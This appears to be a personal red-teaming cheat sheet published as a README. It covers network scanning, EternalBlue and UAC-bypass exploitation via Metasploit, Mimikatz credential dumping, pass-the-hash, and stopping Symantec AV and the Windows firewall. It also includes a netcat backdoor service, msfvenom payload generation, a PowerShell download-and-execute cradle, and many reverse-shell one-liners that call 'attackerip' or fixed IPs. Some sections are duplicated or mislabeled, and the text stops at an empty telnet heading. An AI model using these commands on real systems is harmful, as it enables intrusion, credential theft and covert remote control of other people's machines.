# A Red-Teamer diaries
<p align="center">
  <img src="https://www.welivesecurity.com/wp-content/uploads/2014/05/rooftop-1024x576.png"/>
</p>


This is publicly accessible personal notes about my pentesting/red teaming experiments in a controlled environment that involve playing with various tools and techniques used by penetration testers,  red teams and advanced adversaries.
- [x] Project in progress
## Intrusion Kill Chain
<p align="center">
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT39/APT39Fig2.png" alt="cme"/>
</p>


# Mapping the Network
## RunFinger.py
Gather information about the Domain name and windows machine running in the network

```bash
bash$ cd /usr/share/Responder/tools
bash$ sudo python RunFinger.py -i 192.168.1.1/24
```
or 

```bash
bash$ responder-RunFinger
```

## Nbtscan

Scanning IP networks for NetBIOS name information.

```bash
bash$ sudo nbtscan -v -s : 192.168.1.0/24
```

## Crackmapexec v 4.0

Scan the network range based on the SMB information
```bash
bash$ cme smb 192.168.1.1/24
```

## Nmap scan
Scan all the machine network and save the outputs .
* -oA options : Means output with all format
* -T4 : Fast scan 

Fast Scan
```bash
bash$ nmap -p 1-65535 -sV -sS -T4 -oA output target_IP  
```
Intensive Scan (Note recommended):
```bash
bash$ nmap -p 1-65535 -Pn -A -oA output target_IP 
```
Scan with enumeration of the running services version :
* -sC : Safe Scan
* -sV : Get the service version
```bash
bash$ nmap -sC -sV -oA output target
```

## Angry IP scanner

Download the tool from this link : 
[Angry IP Scanner](http://angryip.org/download/#linux) 
* Change the preferences settings 
> Go to : Preferences -> Ports -> add 80,445,554,21 ,22 in the port selection <br>
> Go to : Preferences -> Display -> select Alive Hosts <br>
> Go to : Preferences -> Pinging -> select Combained (UDP/TCP)

# Lateral Movement and Exploiting

## Scanning for EternalBlue ms17-010
```bash
bash$ nmap -p445 --script smb-vuln-ms17-010 <target>/24
```
If the target is vulnrable the output is as following 

Script Output<br>
Host script results:
```bash
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```
## Exploiting Eternal Blue - Metasploit Module (Windows 7 x64 only )

* Note : 
<br>The default Module supported by Metasploit is exploiting only windows 7 x64 bit 
Otherwise the target will be crashed .

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
      msf exploit(ms17_010_eternalblue) > show targets
            ...targets...
      msf exploit(ms17_010_eternalblue) > set TARGET <target-id>
      msf exploit(ms17_010_eternalblue) > show options
            ...show and set options...
      msf exploit(ms17_010_eternalblue) > exploit

```

## Mimikatz - Metasploit

After obtaining a meterpreter shell, we need to ensure that our session is running with **SYSTEM level privileges** for Mimikatz to function properly.

```bash
meterpreter > getuid
Server username: WINXP-E95CE571A1\Administrator

meterpreter > getsystem
...got system (via technique 1).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Reading Hashes and Passwords from Memory


```bash
meterpreter > load mimikatz
Loading extension mimikatz...success.

meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID   Package    Domain           User              Password
------   -------    ------           ----              --------
0;78980  NTLM       WINXP-E95CE571A1  Administrator     lm{ 00000000000000000000000000000000 }, ntlm{ d6eec67681a3be111b5605849505628f }
0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   lm{ aad3b435b51404eeaad3b435b51404ee }, ntlm{ 31d6cfe0d16ae931b73c59d7e0c089c0 }
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
0;56683  NTLM                                          n.s. (Credentials KO)
0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  n.s. (Credentials KO)

meterpreter > kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================

AuthID   Package    Domain           User              Password
------   -------    ------           ----              --------
0;999    NTLM       WORKGROUP        WINXP-E95CE571A1$  
0;997    Negotiate  NT AUTHORITY     LOCAL SERVICE     
0;56683  NTLM                                          
0;996    Negotiate  NT AUTHORITY     NETWORK SERVICE   
0;78980  NTLM       WINXP-E95CE571A1  Administrator     SuperSecretPassword


meterpreter > mimikatz_command -f sekurlsa::searchPasswords
[0] { Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword }

meterpreter > mimikatz_command -f sekurlsa::logonpasswords
```

# Privilege Escalation of Windows 

### JuicyPotato
```bash
JuicyPotato.exe -l <PORT> -p c:\windows\system32\cmd.exe -t * 
```
### Migrate Process
```bash
msf > ps
msf exploit(bypassuac) > migrate <pid>
```

### Windows Escalate UAC Protection Bypass
```bash
msf > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > set session 1
msf exploit(bypassuac) > exploit
```

### Windows Escalate UAC Protection Bypass (In Memory Injection)
```bash
msf > use exploit/windows/local/bypassuac_injection
msf exploit(bypassuac_injection) > set session 1
msf exploit(bypassuac_injection) > exploit
```
### Windows Escalate UAC Protection Bypass (Script Host Vulnerability)
```bash
msf > use windows/local/bypassuac_vbs
msf exploit(bypassuac_vbs) > set session 1
msf exploit(bypassuac_vbs) > exploit
```
### Windows Escalate UAC Execute RunAs
```bash
msf > use windows/local/ask
msf exploit(ask) > set session 1
msf exploit(ask) > exploit
```

### MS16-032 Secondary Logon Handle Privilege Escalation  Windows 7 32 bit
```bash
msf > use windows/local/ms16_032_secondary_logon_handle_privesc
msf exploit(ms16_032_secondary_logon_handle_privesc) > set session 1
msf exploit(ms16_032_secondary_logon_handle_privesc) > exploit
```
### Windows NTUserMessageCall Win32k Kernel Pool Overflow (Schlamperei)
```bash
msf exploit(ms13_053_schlamperei) >set session 1
msf exploit(ms13_053_schlamperei) >exploit
```

## Crackmapexec V4.0

Enemurate target
```
bash$ cme smb <target> 
```

Access to machine by valid username/password

```
bash$ cme smb <target> -u username -p password
```

Access to machine using the NTLM hash (if u see PWN3D the user hash administrator priveleges )
```
bash$ cme smb <target> -u username -H hash
```
Listing shares

```
bash$ cme smb <target> -u username -p password --shares
```
Enumerate active sessions 
```
bash$ cme smb <target> -u username -p password --sessions
```
Enumerate users by bruteforcing RID's (default: 4000)
```
bash$ cme smb <target> -u username -p password --rid-brute
```

Execute the specified command
```
bash$ cme smb <target> -u username -p password -x 'whoami'
```
Execute the specified PowerShell command

```
bash$ cme smb <target> -u username -p password -X 'whoami'
```
Get Hashes

```
bash$ cme smb <target> -u username -p password --sam
```



## Crackmapexec to Empire agent

First setup an Empire listener:
```
(Empire: listeners) > set Name test
(Empire: listeners) > set Host 192.168.10.3
(Empire: listeners) > set Port 9090
(Empire: listeners) > set CertPath data/empire.pem
(Empire: listeners) > run
(Empire: listeners) > list

[*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     test              http://192.168.10.3:9090                 native    5/0.0                      

(Empire: listeners) > 
```

Start up Empire's RESTful API server:
```
#~ python empire --rest --user empireadmin --pass Password123!

[*] Loading modules from: /home/byt3bl33d3r/Tools/Empire/lib/modules/
 * Starting Empire RESTful API on port: 1337
 * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml
 * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)
```
The username and password that CME uses to authenticate to Empire's RESTful API are stored in the cme.conf file located at ~/.cme/cme.conf:
```
[Empire]
api_host=127.0.0.1
api_port=1337
username=empireadmin
password=Password123!

[Metasploit]
rpc_host=127.0.0.1
rpc_port=55552
password=abc123
```
Then just run the empire_exec module and specify the listener name:
```
#~ crackmapexec 192.168.10.0/24 -u username -p password -M empire_exec -o LISTENER=test
```
# Crackmapexec to Meterpreter
We can use the metinject module to directly inject meterpreter into memory using PowerSploit's Invoke-Shellcode.ps1 script.

First setup your handler:
```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST 192.168.10.3
LHOST => 192.168.10.3
msf exploit(handler) > set exitonsession false
exitonsession => false
msf exploit(handler) > exploit -j
[*] Exploit running as background job.

[*] Started HTTPS reverse handler on https://192.168.10.3:8443
msf exploit(handler) > [*] Starting the payload handler...
```
Then just run the metinject module and specify the LHOST and LPORT values:
```
#~ crackmapexec 192.168.10.0/24 -u username -p password -M metinject -o LHOST=192.168.1
```
# Passing shell from Empire to Meterpreter metasploit 

metasploit listner options
```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf exploit(handler) > set lhost 192.168.1.110
lhost => 192.168.1.110
msf exploit(handler) > set lport 2286
lport => 2286
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > set SessionCommunicationTimeout 0
SessionCommunicationTimeout => 0
msf exploit(handler) > exploit -j
```

Setup Empire to send the agent to Metasploit
```
use module code_execution/shellcode_inject
set Host <ip>
set Port <port>
execute
```
# DeathStar
```
# Start the Empire console and RESTful API
python empire --rest --username empireadmin --password Password123
```
Then grab, setup and run DeathStar:
```
git clone https://github.com/byt3bl33d3r/DeathStar
# Death Star is written in Python3
pip3 install -r requirements.txt
./DeathStar.py
```
# Windows cmd.exe commands

## Add user

```
net user /add [username] [password]
```
## Add as admin
```
new localgroup administrators [username] /add
```
## Add user to RDP group
```
NET LOCALGROUP "Remote Desktop Users" keyoke /ADD
```

# PTH_winexe : open shell without psexec
Example :<br>

```
pth-winexe -U DOMAIN/USERNAME%cc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb //IP_Server cmd.exe
```
Real exempale :<br>

```
pth-winexe -U LAB/Administrator%cc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb //192.168.1.44 cmd.exe
```
# PTH-winexe to Meterpreter
```
msf exploit(web_delivery) > use exploit/multi/script/web_delivery 
msf exploit(web_delivery) > set target 2
target => 2         
msf exploit(web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(web_delivery) > set L
set LHOST         set LISTENERCOMM  set LOGLEVEL      set LPORT         
msf exploit(web_delivery) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf exploit(web_delivery) > set LPORT 1233
LPORT => 1233
msf exploit(web_delivery) > exploit 
[*] Exploit running as background job 0.

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:1233 
[*] Using URL: http://0.0.0.0:8080/gOAr7kQOTh
msf exploit(web_delivery) > [*] Local IP: http://10.2.15.194:8080/gOAr7kQOTh
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c $j=new-object net.webclient;$j.proxy=[Net.WebRequest]::GetSystemWebProxy();$j.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $j.downloadstring('http://127.0.0.1:8080/gOAr7kQOTh');
```
Copy the powershell command into the cmd opened with pth_winexe

# Kiwi collect credentials
```
meterpreter > load kiwi
meterpreter > cred_all
```
# Symantec AV Bypass
```
During our latest pentest, we faced shitty AV problem since we couldn't get any meterpreter session with psexec cuz of Symatec AV, So we would like to share our solution for this problem:
First We Need to connect with the local admin as system using pth (local hash extracted with bkhive and samdump2)

$./pth-winexe -U DOMAIN.COM/USERNAME%cc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb //10.0.42.154 cmd --system

Then let's Stop the AV  Service

cd "C:\Program Files\Symantec\Symantec Endpoint Protection"
smc.exe -stop

Nice now we got rid of the AV, however our payload and IP was still blocked since they use an IPS 
so we used a reverse_https listener and psexec_psh to bypass it:
mohamed@KeyStrOke:~$ msfconsole
use exploit/windows/smb/psexec_psh
set payload windows/meterpreter/reverse_https
set StageEncoder x86/shikata_ga_nai
set EnableStageEncoding true
set SMBUSER USERNAME
set SMBPASS cc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb
set lhost IP
set lport 443
exploit -j
and BOOM   :D
Server username: NT AUTHORITY\SYSTEM
Enjoy your Session
```

# Network

### Nmap Full Web Vulnerable Scan

```
cd /usr/share/nmap/scripts/
wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap -sS -sV --script=vulscan/vulscan.nse target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
nmap -sV --script=vuln target
nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
```

### Dirb Dir Bruteforce

```
dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
```

### Nikto web server scanner

```
nikto -C all -h http://IP
```

### WordPress Scanner

```
git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
./wpscan –url http://IP/ –enumerate p
```


### HTTP Fingerprinting

```
wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h http://IP -s signatures.txt
```

### WordPress Scanner

```
git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
./wpscan –url http://IP/ –enumerate p
```

### SKIP Fish Scanner

```
skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
```

### Nmap Ports Scan

```
1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys)
2)fargement
3)data packed – like orginal one not scan packet
4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target
5)nmap –source-port 53 target
nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)
nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)
nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)
nmap -sA -PN -sN target
nmap -sS -sV -T5 -F -A -O target (version detection)
nmap -sU -v target (Udp)
nmap -sU -P0 (Udp)
nmap -sC 192.168.31.10-12 (all scan default)
```

### NC Scanning

```
nc -v -w 1 target -z 1-1000
for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
```

### Unicornscan

```
us -H -msf -Iv 192.168.56.101 -p 1-65535
us -H -mU -Iv 192.168.56.101 -p 1-65535

-H resolve hostnames during the reporting phase
-m scan mode (sf - tcp, U - udp)
-Iv - verbose
```

### Xprobe2 OS fingerprinting

```
xprobe2 -v -p tcp:80:open IP
```

### Samba Enumeration

```
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
```

### SNMP Enumeration

```
snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
```

### Windows Useful cmds

```
net localgroup Users
net localgroup Administrators
search dir/s *.doc
system("start cmd.exe /k $cmd")
sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
```

### PuTTY Link tunnel

```
Forward remote port to local address
cmd.exe /c echo y | .\plink.exe -P 22 -l <USER> -pw "password" -R PORT_TO_FORWARD:127.0.0.1:ATTACKER_PORT <IP> 2>&1
```

### Meterpreter portfwd

```
# https://www.offensive-security.com/metasploit-unleashed/portfwd/
# forward remote port to local address
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali > rdesktop 127.0.0.1:3389
```

### Enable RDP Access

```
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
```

### Turn Off Windows Firewall

```
netsh firewall set opmode disable
```

### Meterpreter VNC\RDP

```
git clone https://github.com/gentilkiwi/mimikatz.git
privilege::debug
sekurlsa::logonPasswords full
```

### Mimikatz use

```
net user test 1234 /add
net localgroup administrators test /add
```

### Passing the Hash

```
git clone https://github.com/byt3bl33d3r/pth-toolkit
pth-winexe -U hash //IP cmd

or

apt-get install freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

or

meterpreter > run post/windows/gather/hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
meterpreter > shell
```

### Hashcat password cracking

```
hashcat -m 400 -a 0 hash /root/rockyou.txt
```
### Netcat examples

```
c:> nc -l -p 31337
#nc 192.168.0.10 31337
c:> nc -v -w 30 -p 31337 -l < secret.txt
#nc -v -w 2 192.168.0.10 31337 > secret.txt
```
### Banner grabbing with NC

```
nc 192.168.0.10 80
GET / HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/4.0
Referrer: www.example.com
<enter>
<enter>
```
### Window reverse shell

```
c:>nc -Lp 31337 -vv -e cmd.exe
nc 192.168.0.10 31337
c:>nc example.com 80 -e cmd.exe
nc -lp 80

nc -lp 31337 -e /bin/bash
nc 192.168.0.10 31337
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
```
### Find SUID\SGID root files

```
# Find SUID root files
find / -user root -perm -4000 -print

# Find SGID root files:
find / -group root -perm -2000 -print

# Find SUID and SGID files owned by anyone:
find / -perm -4000 -o -perm -2000 -print

# Find files that are not owned by any user:
find / -nouser -print

# Find files that are not owned by any group:
find / -nogroup -print

# Find symlinks and what they point to:
find / -type l -ls
```
### Python shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```
### Python\Ruby\PHP HTTP Server

```
python2 -m SimpleHTTPServer
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:8888
```
### Get PIDs of process

```
fuser -nv tcp 80
fuser -k -n tcp 80
```
### Hydra rdp Bruteforce

```
hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
```
### Mount Remote Windows Share

```
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
```
### Compiling Exploit in Kali

```
gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
```
### Compiling Windows Exploits on Kali

```
c:>nc -Lp 31337 -vv -e cmd.exe
nc 192.168.0.10 31337
c:>nc example.com 80 -e cmd.exe
nc -lp 80

nc -lp 31337 -e /bin/bash
nc 192.168.0.10 31337
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
```
### Window reverse shell

```
wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
wine mingw-get-setup.exe
select mingw32-base
cd /root/.wine/drive_c/windows
wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
cd /root/.wine/drive_c/MinGW/bin
wine gcc -o ability.exe /tmp/exploit.c -lwsock32
wine ability.exe
```
### NASM Commands

```
nasm -f bin -o payload.bin payload.asm
nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
```
### SSH Pivoting
```
ssh -D 127.0.0.1:1080 -p 22 user@IP
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains commands target
```
### SSH Pivoting from One Network to Another

```
ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target
```
### Pivoting Using metasploit

```
route add X.X.X.X 255.255.255.0 1
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E

or

# https://www.offensive-security.com/metasploit-unleashed/pivoting/
meterpreter > ipconfig
IP Address  : 10.1.13.3
meterpreter > run autoroute -s 10.1.13.0/24
meterpreter > run autoroute -p
10.1.13.0          255.255.255.0      Session 1
meterpreter > Ctrl+Z
msf auxiliary(tcp) > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 10.1.13.2
msf exploit(psexec) > exploit
meterpreter > ipconfig
IP Address  : 10.1.13.2
```
### Exploit-DB search using CSV File

```
git clone https://github.com/offensive-security/exploit-database.git
cd exploit-database
./searchsploit –u
./searchsploit apache 2.2
./searchsploit "Linux Kernel"

cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep "<|<=" | sort -k3
```
### MSF Payloads

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c
```
### MSF Linux Reverse Meterpreter Binary

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
```
### MSF Reverse Shell (C Shellcode)

```
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
```
### MSF Reverse Shell Python Script

```
msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
```
### MSF Reverse ASP Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 --platform win -o shell.asp
```
### MSF Reverse Bash Shell

```
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
```

### MSF Reverse PHP Shell

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
add <?php at the beginning
perl -i~ -0777pe's/^/<?php \n/' shell.php
```

### MSF Reverse Win Bin

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
```

### Linux Security Commands

```
# find programs with a set uid bit
find / -uid 0 -perm -4000

# find things that are world writable
find / -perm -o=w

# find names with dots and spaces, there shouldn’t be any
find / -name " " -print
find / -name ".." -print
find / -name ". " -print
find / -name " " -print

# find files that are not owned by anyone
find / -nouser

# look for files that are unlinked
lsof +L1

# get information about procceses with open ports
lsof -i

# look for weird things in arp
arp -a

# look at all accounts including AD
getent passwd

# look at all groups and membership including AD
getent group

# list crontabs for all users including AD
for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done

# generate random passwords
cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=’|fold -w 12| head -n 4

# find all immutable files, there should not be any
find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’

# fix immutable files
chattr -i file
```

### Win Buffer Overflow Exploit Commands

```
msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c

COMMONLY USED BAD CHARACTERS:
\x00\x0a\x0d\x20                              For http request
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)

# Useful Commands:
pattern create
pattern offset (EIP Address)
pattern offset (ESP Address)
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )

!pvefindaddr pattern_create 5000
!pvefindaddr suggest
!pvefindaddr modules
!pvefindaddr nosafeseh

!mona config -set workingfolder C:\Mona\%p
!mona config -get workingfolder
!mona mod
!mona bytearray -b "\x00\x0a"
!mona pc 5000
!mona po EIP
!mona suggest
```

### SEH - Structured Exception Handling

```
# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
!mona suggest
!mona nosafeseh
nseh="\xeb\x06\x90\x90" (next seh chain)
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
```

### ROP (DEP)

```
# https://en.wikipedia.org/wiki/Return-oriented_programming
# https://en.wikipedia.org/wiki/Data_Execution_Prevention
!mona modules
!mona ropfunc -m *.dll -cpb "\x00\x09\x0a"
!mona rop -m *.dll -cpb "\x00\x09\x0a" (auto suggest)
```

### ASLR - Address space layout randomization

```
# https://en.wikipedia.org/wiki/Address_space_layout_randomization
!mona noaslr
```

### EGG Hunter techniques

```
# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
# http://www.fuzzysecurity.com/tutorials/expDev/4.html
!mona jmp -r esp
!mona egg -t lxxl
\xeb\xc4 (jump backward -60)
buff=lxxllxxl+shell
!mona egg -t 'w00t'
```

### GDB Debugger Commands

```
# Setting Breakpoint
break *_start

# Execute Next Instruction
next
step
n
s

# Continue Execution
continue
c

# Data
checking 'REGISTERS' and 'MEMORY'

# Display Register Values: (Decimal,Binary,Hex)
print /d –> Decimal
print /t –> Binary
print /x –> Hex
O/P :
(gdb) print /d $eax
$17 = 13
(gdb) print /t $eax
$18 = 1101
(gdb) print /x $eax
$19 = 0xd
(gdb)

# Display values of specific memory locations
command : x/nyz (Examine)
n –> Number of fields to display ==>
y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)
```

### BASH Reverse Shell

```
bash -i >& /dev/tcp/X.X.X.X/443 0>&1

exec /bin/bash 0&0 2>&0
exec /bin/bash 0&0 2>&0

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do $line 2>&5 >&5; done # or: while read line 0<&5; do $line 2>&5 >&5; done
exec 5<>/dev/tcp/attackerip/4444

cat <&5 | while read line; do $line 2>&5 >&5; done # or:
while read line 0<&5; do $line 2>&5 >&5; done

/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
/bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1
```

### PERL Reverse Shell

```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# for win platform
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
```

### RUBY Reverse Shell

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# for win platform
ruby -rsocket -e 'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### PYTHON Reverse Shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP Reverse Shell

```
php -r '$sock=fsockopen("attackerip",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### JAVA Reverse Shell

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### NETCAT Reverse Shell

```
nc -e /bin/sh attackerip 4444
nc -e /bin/sh 192.168.37.10 443

# If the -e option is disabled, try this
# mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
/bin/sh | nc attackerip 443
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/

# If you have the wrong version of netcat installed, try
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f
```

### TELNET Reverse Shell

```
